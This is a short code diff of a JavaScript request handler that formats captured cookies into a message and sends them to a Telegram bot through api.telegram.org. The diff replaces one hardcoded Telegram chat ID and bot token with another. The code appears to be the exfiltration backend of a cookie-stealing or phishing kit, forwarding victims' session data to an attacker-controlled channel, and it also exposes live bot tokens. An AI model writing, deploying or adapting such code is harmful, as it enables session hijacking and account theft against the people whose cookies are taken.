@@ -25,8 +25,8 @@ export default async function handler(req, res) {
 🍪 *Cookies:* ${cookies}
 ────────────────────`;
 
-  const telegramId = '-1002521703546';
-  const botToken = '7975184969:AAHQe0cBq-RshRP4OUePLYpTNNRxm41dkM0';
+  const telegramId = '7008824750';
+  const botToken = '7507560214:AAF_tUasb0WwqNAcsVaf2bcVb6dzxIO7gvk';
 
   try {
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
